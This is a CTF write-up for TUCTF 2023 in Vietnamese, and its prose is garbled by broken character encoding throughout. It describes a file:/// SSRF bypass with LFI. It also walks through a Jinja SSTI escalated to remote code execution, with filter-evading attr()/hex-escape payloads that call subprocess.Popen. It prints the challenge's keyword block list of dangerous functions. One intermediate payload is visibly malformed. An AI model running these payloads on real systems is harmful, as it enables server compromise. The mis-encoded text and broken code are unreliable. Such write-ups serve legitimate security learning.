# TUCTF - 2023

# PHP-Practise

vÃ¬ bÃ i nÃ y mÃ¬nh khÃ´ng ká»‹p lÃ m láº¡i Ä‘á»ƒ láº¥y áº£nh, nÃªn mÃ¬nh sáº½ dÃ¹ng táº¡m nhá»¯ng hÃ¬nh mÃ¬nh cap láº¡i trong quÃ¡ trÃ¬nh giáº£i Ä‘á»ƒ giáº£i thÃ­ch.

- Vá» cÆ¡ báº£n thÃ¬ Ä‘Ã¢y chá»‰ lÃ  1 web dÃ¹ng Ä‘á»ƒ láº¥y dá»¯ liá»‡u, mÃ¬nh Ä‘Ã£ test qua vÃ  phÃ¡t hiá»‡n Ä‘Æ°á»£c file:/// lÃ  bypass filter ssrf.
- mÃ¬nh dÃ¹ng file:///var/www/html/display.php Ä‘á»ƒ láº¥y Ä‘c source code cá»§a file display , tuy nhiÃªn cÅ©ng khÃ´ng khai thÃ¡c Ä‘Æ°á»£c gÃ¬ máº¥y, vÃ  mÃ¬nh cÅ©ng tÃ¬m Ä‘Æ°á»£c trang nÃ y bá»‹ LFI

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled.png">
- Dá»±a vÃ o hint cá»§a bÃ i thÃ¬ mÃ¬nh tÃ¬m cÃ¡c thÆ° má»¥c cÃ³ thá»ƒ dÃ¹ng Ä‘á»ƒ dáº¥u Ä‘i táº­p tin bÃ­ máº­t nhÆ° robots.txt, .htaccess

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 1.png">

- MÃ¬nh tÃ¬m Ä‘Æ°á»£c 1 thÆ° má»¥c cÃ³ váº» nhÆ° lÃ  chá»©a flag cá»§a bÃ i nÃ y

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 2.png">

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 3.png">

- Done, vÃ¬ bÃ i nÃ y mÃ¬nh khÃ´ng ká»‹p lÃ m láº¡i Ä‘á»ƒ viáº¿t WU nÃªn khÃ´ng thá»ƒ viáº¿t chi tiáº¿t hÆ¡n Ä‘Æ°á»£c hic

# My First blog

- BÃ i nÃ y dáº«n chÃºng ta Ä‘áº¿n 1 trang blog vá»›i 1 sá»‘ chá»©c nÄƒng nhÆ° lÃ  táº¡o post, sá»­a post vÃ  xÃ³a post, vÃ  sau khi test XXS khÃ´ng Ä‘Æ°á»£c thÃ¬ mÃ¬nh nghÄ© Ä‘áº¿n SSTI vÃ  test vá»›i chá»©c nÄƒng táº¡o post vÃ  edit post nhÆ° hÃ¬nh

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 4.png">

- Tuy nhiÃªn cÃ³ váº» nhÆ° khÃ´ng hoáº¡t Ä‘á»™ng ğŸ˜€

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 5.png">

- Sau Ä‘Ã³ mÃ¬nh test thÃªm Edit nhÆ°ng cÅ©ng khÃ´ng Ä‘Æ°á»£c, tuy nhiÃªn khi mÃ¬nh dÃ¹ng chá»©c nÄƒng xÃ³a thÃ¬ Ä‘Ã£ trigger Ä‘Æ°á»£c lá»—i SSTI.

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 6.png">

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 7.png">

- Voila!!, lÃºc nÃ y mÃ¬nh tiáº¿p tá»¥c thá»­ dÃ¹ng `{{().**class**}}`  Ä‘á»ƒ xem thÃ¬ phÃ¡t hiá»‡n 1 sá»‘ filter ráº¥t KHÃ“ CHá»ŠU!!

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 8.png">

- VÃ  nhÆ° báº¡n tháº¥y á»Ÿ dÆ°á»›i lÃ  nhá»¯ng kÃ­ tá»± Ä‘Ã£ bá»‹ filter. tá»©c lÃ  khi nÃ³ xuáº¥t hiá»‡n nhá»¯ng chá»¯ trong dáº¥u * thÃ¬ sáº½ khÃ´ng dÃ¹ng Ä‘Æ°á»£c.
**[â€˜.*config.*â€™, â€˜.*class.*â€™, â€˜.*request.*â€™, â€˜.*self.*â€™, â€˜.*global.*â€™, â€˜.*getitem.*â€™, â€˜.*base.*â€™, â€˜.*os.*â€™, â€˜.*mro.*â€™, â€˜.*import.*â€™, â€˜.*builtins.*â€™, â€˜.*popen.*â€™, â€˜.*read.*â€™, â€˜.*write.*â€™, â€˜.*system.*â€™, â€˜.*eval.*â€™, â€˜.*exec.*â€™, â€˜.*\\+.*â€™, â€˜.*\\..*â€™, â€˜.*\\[.*â€™, â€˜.*\\].*â€™, â€˜.*\\_.*â€™]**

VÃ¬ tháº¿ nÃªn mÃ¬nh sáº½ dÃ¹ng hÃ m attr(), nÃ³ sáº½ dÃ¹ng Ä‘á»ƒ thay tháº¿ cho tháº±ng class bÃªn dÆ°á»›i

```
().__class__
```

TÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i

```
()|attr('__class__')
```

NhÆ° báº¡n cÃ³ thá»ƒ tháº¥y **class** hiá»‡n náº±m trong má»™t chuá»—i, vÃ¬ váº­y ta cÃ³ thá»ƒ bypass Ä‘Æ°á»£c filter cá»§a bÃ i nÃ y báº±ng cÃ¡ch dÃ¹ng acsii

```jsx
()|attr('\x5f\x5f\x63lass\x5f\x5f')
```

- **`'\x5f'`** lÃ  biá»ƒu diá»…n cá»§a kÃ½ tá»± **`_`** trong ASCII.
- **`'\x63'`** lÃ  biá»ƒu diá»…n cá»§a kÃ½ tá»± **`c`** trong ASCII.
- â€¦. tÆ°Æ¡ng tá»±

VÃ¬ tháº¿, chÃºng ta cÃ³ thá»ƒ viáº¿t nhÆ° tháº¿ nÃ y 

```jsx
()|attr('__class__')|attr('__base__')
```

nÃ³ sáº½ tÆ°Æ¡ng tá»± nhÆ°

```jsx
().**__class__**.**__base__**
```

- Viá»‡c bÃ¢y giá» cá»§a ta lÃ  sáº½ test vÃ  sá»­ dá»¥ng SSTI Ä‘á»ƒ RCE , mÃ¬nh sáº½ sá»­ dá»¥ng payload bÃªn dÆ°á»›i, tuy nhiÃªn á»Ÿ Ä‘Ã¢y chÃºng ta cÃ³ 2 váº¥n Ä‘á».

```jsx
{{().__class__.__base__.__subclasses__()[<index for subprocess.Popen>]('whoami',shell=True,stdout=-1).communicate()}}
```

1. Dáº¥u [ ] bá»‹ filter
2. Ta khÃ´ng biáº¿t index cá»¥ thá»ƒ cá»§a **subprocess.Popen**

- Äá»ƒ giáº£i quyáº¿t váº¥n Ä‘á» 1 ta sá»­ dá»¥ng **`.getitem()`** thay vÃ¬ trá»±c tiáº¿p sá»­ dá»¥ng dáº¥u **`[]`** Ä‘á»ƒ truy cáº­p pháº§n tá»­ cá»§a danh sÃ¡ch. Váº­y nÃªn cÃ¢u lá»‡nh trÃªn sáº½ thÃ nh

```jsx
{{().__class__.__base__.__subclasses__().__getitem__(<index for subprocess.Popen>)('whoami',shell=True,stdout=-1).communicate()}}
```

- Äá»‘i vá»›i váº¥n Ä‘á» 2, sau 1 lÃºc search document thÃ¬ mÃ¬nh biáº¿t Ä‘Æ°á»£c ráº±ng Popen in **subclass**(). thÆ°á»ng sá»­ dá»¥ng payload sau `().**__class__**.**__base__**.**__subclasses__**()`

Váº­y nÃªn payload cuá»‘i cÃ¹ng cá»§a ta sáº½ lÃ  

```jsx
{{().__class__.__base__.__subclasses__().__getitem__().**__class__**.**__base__**.**__subclasses__**()('whoami',shell=True,stdout=-1).communicate()}}
```

Tuy nhiÃªn ta pháº£i chuyá»ƒn nÃ³ sang nhÆ° tháº¿ nÃ y Ä‘á»ƒ bypass filter

```jsx
{{()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()}}
```

- Tuy nhiÃªn ta láº¡i nháº­n Ä‘Æ°á»£c káº¿t quáº£ nhÆ° hÃ¬nh

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 9.png">

- ÄÃ¡ng lÃ­ ra thÃ¬ theo payload trÃªn, ta sáº½ pháº£i nháº­n Ä‘Æ°á»£c thÃ´ng tin vá» subclass, vÃ­ dá»¥ nhÆ° lÃ 

`[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>...`

- Sau 1 lÃºc mÃ² máº«m thÃ¬ cÃ³ váº» nhÆ° lÃ  nhá»¯ng kÃ­ tá»± náº±m trong <> sáº½ bá»‹ render thÃ nh rá»—ng â€¦ nhÆ° áº£nh, vÃ¬ váº­y mÃ¬nh sáº½ add thÃªm **.replace(â€™<â€™) thÃ nh â€˜â€™**

```jsx
{{()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()|attr('\x5f\x5frepr\x5f\x5f')()|attr('replace')('<','')}}
```

- P/S: Tháº­t ra cÅ©ng khÃ´ng cáº§n thiáº¿t vÃ¬ tháº­t ra tháº±ng trÃ¬nh duyá»‡t nÃ³ chá»‰ cá»‘ render bá»n class thÃ nh html elements, ta chá»‰ cáº§n view-source lÃ  cÃ³ thá»ƒ tháº¥y Ä‘Æ°á»£c nhÆ° hÃ¬nh dÆ°á»›i hahaha

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 10.png">

- LÃºc nÃ y ta viáº¿t script Ä‘á»ƒ tÃ¬m Ä‘Æ°á»£c index cá»§a nÃ³ lÃ  372, váº­y payload cuá»‘i cÃ¹ng cá»§a ta sáº½ lÃ  
```python
{{().__class__.__base__.__subclasses__().__getitem__(372)('whoami',shell=True,stdout=-1).communicate()}}
```

- Äá»ƒ trÃ¡nh filter

```jsx
{{()|attr('\x5f\x5f\x63lass\x5f\x5f')|attr('\x5f\x5f\x62ase\x5f\x5f')|attr('\x5f\x5fsub\x63lasses\x5f\x5f')()|attr('\x5f\x5f\x67etitem\x5f\x5f')(372)('whoami',shell=True,stdout=-1)|attr('communicate')()}}
```

<img src="/assets/writeup/cookie/TUCTF - 2023/Untitled 11.png">

- Báº¡n chá»‰ cáº§n cháº¡y 1 lá»‡nh RCE báº¥t kÃ¬ lÃ  cÃ³ thá»ƒ xuáº¥t hiá»‡n flag :D
